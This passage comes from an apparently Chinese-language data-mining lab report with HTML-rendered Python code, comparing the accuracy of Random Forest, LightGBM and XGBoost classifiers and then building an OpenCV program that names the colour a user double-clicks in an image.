class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">classifier = RandomForestClassifier(n_estimators = <span class="number">10</span>)</span><br><span class="line">classifier.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Predicting the Test set results</span></span><br><span class="line">y_pred = classifier.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = classifier.predict(X_train)</span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for Random Forest = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for Random Forest = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for Random Forest = 0.9834710743801653</code><br><code>Accuracy for test set for Random Forest = 0.7049180327868853</code></p>
<h4 id="3-6-LightGBM"><a href="#3-6-LightGBM" class="headerlink" title="3.6 LightGBM"></a>3.6 LightGBM</h4><p><strong>代码解析：</strong></p>
<ol>
<li>数据准备：使用<code>lgb.Dataset</code>函数将训练集的特征<code>X_train</code>和标签<code>y_train</code>组成LightGBM需要的数据集对象<code>d_train</code>。</li>
<li>参数设置：定义一个空字典<code>params</code>用于设置LightGBM的参数。</li>
<li>模型训练：使用<code>lgb.train</code>函数训练LightGBM模型。传入参数<code>params</code>表示模型的参数设置，<code>d_train</code>表示训练数据集，<code>100</code>表示训练的轮数（迭代次数）。</li>
<li>预测测试集结果：使用训练好的模型对测试集的特征<code>X_test</code>进行预测，得到预测的概率值<code>y_pred</code>。</li>
<li>二值化处理：根据设定的阈值（0.5），将概率值转换为二进制的类别标签。概率值大于等于0.5的被划分为类别1，小于0.5的被划分为类别0。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的模型对训练集的特征<code>X_train</code>进行预测，得到预测的概率值<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># applying lightGBM</span></span><br><span class="line"><span class="keyword">import</span> lightgbm <span class="keyword">as</span> lgb</span><br><span class="line"></span><br><span class="line">d_train = lgb.Dataset(X_train, label = y_train)</span><br><span class="line">params = &#123;&#125;</span><br><span class="line"></span><br><span class="line">clf = lgb.train(params, d_train, <span class="number">100</span>)</span><br><span class="line"><span class="comment">#Prediction</span></span><br><span class="line">y_pred = clf.predict(X_test)</span><br><span class="line"><span class="comment">#convert into binary values</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(y_pred)):</span><br><span class="line">    <span class="keyword">if</span> y_pred[i]&gt;= <span class="number">0.5</span>:       <span class="comment"># setting threshold to .5</span></span><br><span class="line">       y_pred[i]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">       y_pred[i]=<span class="number">0</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = clf.predict(X_train)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(y_pred_train)):</span><br><span class="line">    <span class="keyword">if</span> y_pred_train[i]&gt;= <span class="number">0.5</span>:       <span class="comment"># setting threshold to .5</span></span><br><span class="line">       y_pred_train[i]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">       y_pred_train[i]=<span class="number">0</span></span><br><span class="line">       </span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for LightGBM = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for LightGBM = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for LightGBN = 0.9958677685950413</code><br><code>Accuracy for test set for LightGBN = 0.7704918032786885</code></p>
<h4 id="3-7-XGBoost"><a href="#3-7-XGBoost" class="headerlink" title="3.7 XGBoost"></a>3.7 XGBoost</h4><p><strong>代码解析：</strong></p>
<ol>
<li>模型训练：使用<code>XGBClassifier</code>类创建一个XGBoost分类器对象<code>xg</code>。然后，使用<code>fit</code>方法将训练集的特征<code>X_train</code>和标签<code>y_train</code>作为输入，对分类器进行训练。</li>
<li>预测测试集结果：使用训练好的分类器对测试集的特征<code>X_test</code>进行预测，得到预测的类别标签<code>y_pred</code>。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的分类器对训练集的特征<code>X_train</code>进行预测，得到预测的类别标签<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># applying XGBoost</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#from sklearn.model_selection import train_test_split</span></span><br><span class="line"><span class="comment">#X_train, X_test, y_train, y_test = train_test_split(X, target, test_size = 0.20, random_state = 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBClassifier</span><br><span class="line">xg = XGBClassifier()</span><br><span class="line">xg.fit(X_train, y_train)</span><br><span class="line">y_pred = xg.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = xg.predict(X_train)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(y_pred_train)):</span><br><span class="line">    <span class="keyword">if</span> y_pred_train[i]&gt;= <span class="number">0.5</span>:       <span class="comment"># setting threshold to .5</span></span><br><span class="line">       y_pred_train[i]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">       y_pred_train[i]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for XGBoost = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for XGBoost = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for XGBoost = 0.987603305785124 </code>Accuracy for test set for XGBoost &#x3D; 0.7540983606557377&#96;</p>
<h1 id="四、实验结果-2"><a href="#四、实验结果-2" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>通过对上述七个模型进行混淆矩阵评估度量，得到以下实验结果：<br><code>Accuracy for training set for svm = 0.9256198347107438 </code><br><code>Accuracy for test set for svm = 0.8032786885245902</code></p>
<p><code>Accuracy for training set for Naive Bayes = 0.8677685950413223</code><br><code>Accuracy for test set for Naive Bayes = 0.7868852459016393</code></p>
<p><code>Accuracy for training set for Logistic Regression = 0.8677685950413223</code><br><code>Accuracy for test set for Logistic Regression = 0.8032786885245902</code></p>
<p><code>Accuracy for training set for Decision Tree = 1.0</code><br><code>Accuracy for test set for Decision Tree = 0.8032786885245902</code></p>
<p><code>Accuracy for training set for Random Forest = 0.9834710743801653</code><br><code>Accuracy for test set for Random Forest = 0.7049180327868853</code></p>
<p><code>Accuracy for training set for LightGBN = 0.9958677685950413</code><br><code>Accuracy for test set for LightGBN = 0.7704918032786885</code></p>
<p><code>Accuracy for training set for XGBoost = 0.987603305785124 </code>Accuracy for test set for XGBoost &#x3D; 0.7540983606557377&#96;<br>由此可得，在训练集上Decision Tree具有最高的Accuracy；而在测试集上SVM、Logistic Regression、Decision Tree具有最高的Accuracy。</p>
<h1 id="五、实验分析-2"><a href="#五、实验分析-2" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>此次实验，在多个模型上进行了优劣对比，但在模型的评估度量上只使用了混淆矩阵中的Accuracy，往后可以考虑用更多评估度量标准来对模型进行评估，评估模型的性能和可靠性。以此获得更加全面准确的模型报告。</p>
<h1 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h1><h1 id="一、实验目的-3"><a href="#一、实验目的-3" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1) 编写程序，实现对图片上颜色的检测。<br>(2) 写出实验报告。</p>
<h1 id="二、实验原理-3"><a href="#二、实验原理-3" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)导入所需的库：代码中导入了 pandas 和 cv2 库。pandas 用于读取颜色名称数据集，cv2 用于处理图像。 </p>
<p>(2)读取图像和颜色名称数据集：使用 cv2.imread() 函数读取图像文件，并使用 pandas 的 read_csv() 函数读取颜色名称数据集。 </p>
<p>(3)定义函数获取颜色名称：定义了一个名为 getColorName() 的函数，用于根据 RGB 值获取对应的颜色名称。该函数通过计算 RGB 值与数据集中每个颜色的差异来确定最匹配的颜色名称。</p>
<p>(4)定义鼠标回调函数：定义了一个名为 draw_function() 的回调函数，用于处理鼠标事件。当用户双击鼠标左键时，该函数会获取鼠标点击位置的 RGB 值，并将其保存到全局变量中。</p>
<p>(5)主循环：在主循环中，首先检查是否有点击事件发生。如果发生点击事件，则在图像上绘制矩形框和显示颜色名称。然后，根据颜色的亮度值，选择合适的文本颜色来显示颜色名称。循环将继续运行，直到用户按下键盘上的 Esc 键。  </p>
<p>(7)显示图像和关闭窗口：使用 cv2.imshow() 函数显示带有颜色信息的图像，并使用 cv2.destroyAllWindows() 函数关闭窗口。</p>
<h1 id="三、实验内容和步骤-3"><a href="#三、实验内容和步骤-3" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容-3"><a href="#1-实验内容-3" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>用python编写程序，实现颜色检测的程序：读取一张图片，当用户在图片上双击鼠标左键时，程序会提取该位置的像素颜色，并根据颜色的RGB值在图片上显示颜色名称。</li>
<li>测试程序</li>
</ol>
<h2 id="2-实验步骤-3"><a href="#2-实验步骤-3" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>导入库</li>
<li>定义变量和函数</li>
<li>主函数</li>
</ol>
<p>具体步骤：</p>
<h3 id="1-导入库-1"><a href="#1-导入库-1" class="headerlink" title="1. 导入库"></a>1. 导入库</h3><p><code>pandas</code>用于读取颜色名称数据，<code>cv2</code>用于图像处理。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> cv2</span><br></pre></td></tr></table></figure>
<h3 id="2-定义变量和函数"><a href="#2-定义变量和函数" class="headerlink" title="2. 定义变量和函数"></a>2. 定义变量和函数</h3><ul>
<li><code>imageUrl</code>：指定要读取的图片路径。</li>
<li><code>clicked</code>：记录是否有鼠标双击事件发生。</li>
<li><code>redValue</code>、<code>greenValue</code>、<code>blueValue</code>：记录选定位置的像素颜色的RGB值。</li>
<li><code>xPosition</code>、<code>yPosition</code>：记录鼠标双击位置的坐标。</li>
<li><code>colorNameDataFrame</code>：使用<code>pandas</code>读取颜色名称数据，并进行必要的处理。</li>
<li><code>getColorName()</code>函数：根据给定的RGB值，从颜色名称数据中找到最接近的颜色名称。</li>
<li><code>draw_function()</code>函数：处理鼠标双击事件的回调函数，记录选定位置的像素颜色的RGB值。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">imageUrl = <span class="string">&#x27;E:\image.png&#x27;</span></span><br><span class="line">clicked = <span class="literal">False</span></span><br><span class="line">redValue = <span class="number">0</span></span><br><span class="line">greenValue = <span class="number">0</span></span><br><span class="line">blueValue = <span class="number">0</span></span><br><span class="line">xPosition = <span class="number">0</span></span><br><span class="line">yPosition = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">colorNameDataFrame = pd.read_csv(<span class="string">&#x27;数据挖掘\数据挖掘_实验部分\实验6：颜色检测实验_Color Detection\Dataset\wikipedia_color_names.csv&#x27;</span>)</span><br><span class="line">colorNameDataFrame.drop(colorNameDataFrame.iloc[:,<span class="number">5</span>:<span class="number">8</span>], inplace=<span class="literal">True</span>, axis=<span class="number">1</span>)</span><br><span class="line">colorNameDataFrame.rename(columns=&#123;<span class="string">&#x27;Hex (24 bit)&#x27;</span>:<span class="string">&#x27;Hex&#x27;</span>, <span class="string">&#x27;Red (8 bit)&#x27;</span>:<span class="string">&#x27;Red&#x27;</span>, <span class="string">&#x27;Green (8 bit)&#x27;</span>:<span class="string">&#x27;Green&#x27;</span>, <span class="string">&#x27;Blue (8 bit)&#x27;</span>:<span class="string">&#x27;Blue&#x27;</span>&#125;, inplace=<span class="literal">True</span>)</span><br><span class="line">image = cv2.imread(imageUrl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getColorName</span>(<span class="params">red,green,blue</span>):</span><br><span class="line">    minimumValue = <span class="number">10000</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(colorNameDataFrame)):</span><br><span class="line">        rgbValue = <span class="built_in">abs</span>(red- <span class="built_in">int</span>(colorNameDataFrame.loc[i,<span class="string">&quot;Red&quot;</span>])) + <span class="built_in">abs</span>(green- <span class="built_in">int</span>(colorNameDataFrame.loc[i,<span class="string">&quot;Green&quot;</span>]))+ <span class="built_in">abs</span>(blue- <span class="built_in">int</span>(colorNameDataFrame.loc[i,<span class="string">&quot;Blue&quot;</span>]))</span><br><span class="line">        <span class="keyword">if</span>(rgbValue &lt;= minimumValue):</span><br><span class="line">            minimumValue = rgbValue</span><br><span class="line">            colorName = colorNameDataFrame.loc[i,<span class="string">&quot;Name&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> colorName</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_function</span>(<span class="params">event, x,y, flags, param</span>):</span><br><span class="line">    <span class="keyword">if</span> event == cv2.EVENT_LBUTTONDBLCLK:</span><br><span class="line">        <span class="keyword">global</span> blueValue, greenValue, redValue, xPosition, yPosition, clicked</span><br><span class="line">        clicked = <span class="literal">True</span></span><br><span class="line">        xPosition = x</span><br><span class="line">        yPosition = y</span><br><span class="line">        blueValue, greenValue, redValue = image[yPosition, xPosition]</span><br><span class="line">        blueValue = <span class="built_in">int</span>(blueValue)</span><br><span class="line">        greenValue = <span class="built_in">int</span>(greenValue)</span><br><span class="line">        redValue = <span class="built_in">int</span>(redValue)</span><br></pre></td></tr></table></figure>
<strong>代码解析：</strong></li>
</ul>
<ol>
<li><code>getColorName()</code>函数：<ol>
<li>初始化变量：将 <code>minimumValue</code> 初始化为一个较大的值，以便在比较过程中更新最小差异值。初始化 <code>colorName</code> 为空字符串，用于保存最匹配的颜色名称。    </li>
<li>遍历颜色名称数据集：使用 <code>for</code> 循环遍历颜色名称数据集的每一行。</li>
<li>计算差异值：对于每一行，将给定的 RGB 值与数据集中对应的 RGB 值进行差值计算。差值计算使用绝对值函数 <code>abs()</code> 来确保计算结果为正数。</li>
<li>更新最小差异值和颜色名称：如果计算得到的差异值小于等于当前的最小差异值 <code>minimumValue</code>，则更新最小差异值为当前差异值，并将对应的颜色名称保存到 <code>colorName</code> 中。</li>
<li>返回颜色名称：完成遍历后，返回最匹配的颜色名称</li>
</ol>
</li>
<li><code>draw_function()</code>函数：<ol>
<li>检查事件类型：通过判断 <code>event</code> 是否等于 <code>cv2.EVENT_LBUTTONDBLCLK</code>，确定当前事件是否为鼠标双击事件。</li>
<li>更新全局变量：如果是鼠标双击事件，将全局变量 <code>clicked</code> 设置为 <code>True</code>，表示鼠标已被点击。同时更新全局变量 <code>xPosition</code> 和 <code>yPosition</code>，记录鼠标点击位置的坐标。</li>
<li>获取像素值：通过访问图像 <code>image</code> 的像素值，获取鼠标点击位置 <code>(xPosition, yPosition)</code> 处的 RGB 值，并将其保存到全局变量 <code>blueValue</code>、<code>greenValue</code> 和 <code>redValue</code> 中。</li>
<li>转换数据类型：将获取的 RGB 值转换为整数类型，以便后续处理。</li>
</ol>
</li>
</ol>
<h3 id="3-主函数"><a href="#3-主函数" class="headerlink" title="3. 主函数"></a>3. 主函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    cv2.namedWindow(<span class="string">&#x27;Color Name&#x27;</span>)</span><br><span class="line">    cv2.setMouseCallback(<span class="string">&#x27;Color Name&#x27;</span>, draw_function)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):        </span><br><span class="line">        <span class="keyword">if</span> (clicked):            </span><br><span class="line">            cv2.rectangle(image, (<span class="number">20</span>, <span class="number">20</span>), (<span class="number">950</span>, <span class="number">60</span>), (blueValue, greenValue, redValue), -<span class="number">1</span>)</span><br><span class="line">            colorName = <span class="string">&#x27;Selected color name is:-&#x27;</span> + getColorName(redValue, greenValue, blueValue)</span><br><span class="line">            cv2.putText(image, colorName, (<span class="number">50</span>, <span class="number">50</span>), <span class="number">2</span>, <span class="number">0.75</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">1</span>, cv2.FONT_ITALIC)</span><br><span class="line">            minimumValue = <span class="built_in">abs</span>(redValue + greenValue + blueValue)</span><br><span class="line">            <span class="keyword">if</span> (minimumValue &gt;= <span class="number">600</span>):</span><br><span class="line">                cv2.putText(image, colorName, (<span class="number">50</span>, <span class="number">50</span>), <span class="number">2</span>, <span class="number">0.75</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">1</span>, cv2.FONT_ITALIC)</span><br><span class="line">            clicked = <span class="literal">False</span></span><br><span class="line">        cv2.imshow(<span class="string">&quot;Color Name&quot;</span>, image)</span><br><span class="line">        <span class="comment"># Break the loop when user hits &#x27;esc&#x27; key</span></span><br><span class="line">        <span class="keyword">if</span> cv2.waitKey(<span class="number">20</span>) &amp; <span class="number">0xFF</span> == <span class="number">27</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>创建窗口和绑定鼠标回调函数：<ul>
<li>使用<code>cv2.namedWindow()</code>创建名为”Color Name”的窗口。</li>
<li>使用<code>cv2.setMouseCallback()</code>绑定鼠标回调函数。</li>
</ul>
</li>
<li>进入循环：<ul>
<li>如果发生了鼠标双击事件（<code>clicked</code>为True），根据选定位置的RGB值在图片上绘制矩形和颜色名称。</li>
<li>调用<code>getColorName()</code>函数获取选定颜色的名称，并在图片上显示。</li>
<li>如果颜色的RGB值的绝对值之和大于等于600，将颜色名称的文字颜色设置为黑色。</li>
<li>将处理后的图片显示在窗口中。</li>
<li>如果用户按下了ESC键，退出循环</li>
</ul>
</li>
</ol>
<h2 id="3-完整程序代码"><a href="#3-完整程序代码" class="headerlink" title="(3)完整程序代码"></a>(3)完整程序代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">imageUrl = <span class="string">&#x27;E:\image.png&#x27;</span></span><br><span class="line">clicked = <span class="literal">False</span></span><br><span class="line">redValue = <span class="number">0</span></span><br><span class="line">greenValue = <span class="number">0</span></span><br><span class="line">blueValue = <span class="number">0</span></span><br><span class="line">xPosition = <span class="number">0</span></span><br><span class="line">yPosition = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">colorNameDataFrame = pd.read_csv(<span class="string">&#x27;数据挖掘\数据挖掘_实验部分\实验6：颜色检测实验_Color Detection\Dataset\wikipedia_color_names.csv&#x27;</span>)</span><br><span class="line">colorNameDataFrame.drop(colorNameDataFrame.iloc[:,<span class="number">5</span>:<span class="number">8</span>], inplace=<span class="literal">True</span>, axis=<span class="number">1</span>)</span><br><span class="line">colorNameDataFrame.rename(columns=&#123;<span class="string">&#x27;Hex (24 bit)&#x27;</span>:<span class="string">&#x27;Hex&#x27;</span>, <span class="string">&#x27;Red (8 bit)&#x27;</span>:<span class="string">&#x27;Red&#x27;</span>, <span class="string">&#x27;Green (8 bit)&#x27;</span>:<span class="string">&#x27;Green&#x27;</span>, <span class="string">&#x27;Blue (8 bit)&#x27;</span>:<span class="string">&#x27;Blue&#x27;</span>&#125;, inplace=<span class="literal">True</span>)</span><br><span class="line">image = cv2.imread(imageUrl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getColorName</span>(<span class="params">red,green,blue</span>):</span><br><span class="line">    minimumValue = <span class="number">10000</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(colorNameDataFrame)):</span><br><span class="line">        rgbValue = <span class="built_in">abs</span>(red- <span class="built_in">int</span>(colorNameDataFrame.loc[i,<span class="string">&quot;Red&quot;</span>])) + <span class="built_in">abs</span>(green- <span class="built_in">int</span>(colorNameDataFrame.loc[i,<span class="string">&quot;Green&quot;</span>]))+ <span class="built_in">abs</span>(blue- <span class="built_in">int</span>(colorNameDataFrame.loc[i,<span class="string">&quot;Blue&quot;</span>]))</span><br><span class="line">        <span class="keyword">if</span>(rgbValue &lt;= minimumValue):</span><br><span class="line">            minimumValue = rgbValue</span><br><span class="line">            colorName = colorNameDataFrame.loc[i,<span class="string">&quot;Name&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> colorName</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_function</span>(<span class="params">event, x,y, flags, param</span>):</span><br><span class="line">    <span class="keyword">if</span> event == cv2.EVENT_LBUTTONDBLCLK:</span><br><span class="line">        <span class="keyword">global</span> blueValue, greenValue, redValue, xPosition, yPosition, clicked</span><br><span class="line">        clicked = <span class="literal">True</span></span><br><span class="line">        xPosition = x</span><br><span class="line">        yPosition = y</span><br><span class="line">        blueValue, greenValue, redValue = image[yPosition, xPosition]</span><br><span class="line">        blueValue = <span class="built_in">int</span>(blueValue)</span><br><span class="line">        greenValue = <span class="built_in">int</span>(greenValue)</span><br><span class="line">        redValue = <span class="built_in">int</span>(redValue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    cv2.namedWindow(<span class="string">&#x27;Color Name&#x27;</span>)</span><br><span class="line">    cv2.setMouseCallback(<span class="string">&#x27;Color Name&#x27;</span>, draw_function)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):        </span><br><span class="line">        <span class="keyword">if</span> (clicked):            </span><br><span class="line">            cv2.rectangle(image, (<span class="number">20</span>, <span class="number">20</span>), (<span class="number">950</span>, <span class="number">60</span>), (blueValue, greenValue, redValue), -<span class="number">1</span>)</span><br><span class="line">            colorName = <span class="string">&#x27;Selected color name is:-&#x27;</span> + getColorName(redValue, greenValue, blueValue)</span><br><span class="line">            cv2.putText(image, colorName, (<span class="number">50</span>, <span class="number">50</span>), <span class="number">2</span>, <span class="number">0.75</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">1</span>, cv2.FONT_ITALIC)</span><br><span class="line">            minimumValue = <span class="built_in">abs</span>(redValue + greenValue + blueValue)</span><br><span class="line">            <span class="keyword">if</span> 